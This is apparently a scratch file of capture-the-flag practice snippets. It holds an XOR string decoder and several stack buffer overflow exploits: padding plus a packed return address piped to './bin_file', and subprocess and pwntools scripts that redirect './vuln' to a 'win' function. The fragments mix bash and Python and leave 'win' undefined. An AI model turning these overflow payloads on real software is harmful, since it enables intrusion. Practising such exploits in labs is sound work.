# s = '\x03BG\x04EhD\x04TE\x04ChG\x03DD@\aES'
# print(len(s))
# for x in s:
#     print(chr(ord(x) ^ 0x37), end='')

import struct
payload = struct.pack("<I", 0x444555)
print(payload)
payload = b'A' * 200 + payload
print(payload)
echo -ne 'AAAAAAAA...UED\x00' | ./bin_file

import subprocess, struct

p = subprocess.Popen(["./vuln"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE)

payload = b"A"*72 + struct.pack("<Q", win)
p.stdin.write(payload)


from pwn import *

p = process("./vuln")
payload = b"A"*72 + p64(win)
p.sendline(payload)
p.interactive()